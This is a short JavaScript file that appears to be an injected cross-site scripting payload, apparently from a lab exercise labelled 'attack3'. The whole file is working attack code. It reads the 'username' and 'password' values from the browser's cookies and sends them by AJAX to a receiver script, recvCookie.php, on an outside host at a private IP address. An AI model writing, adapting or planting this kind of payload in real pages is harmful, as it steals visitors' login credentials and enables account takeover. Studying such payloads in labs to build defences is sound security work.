var IP = "http://192.168.1.106";

function getCookie(cname) {
    var name = cname + "=";
    var decodedCookie = decodeURIComponent(document.cookie);
    var ca = decodedCookie.split(';');
    for(var i = 0; i <ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}

var pass = getCookie('password');
var user = getCookie('username');

$.ajax({
  url: IP + '/attack3/recvCookie.php',
  type: 'GET',
  data: {
    password :pass,
    username: user
  },
  success: function(response){
  //alert("ajax complete");
  },
  error: function(xhr){
  //alert("ajax error");
  }
});
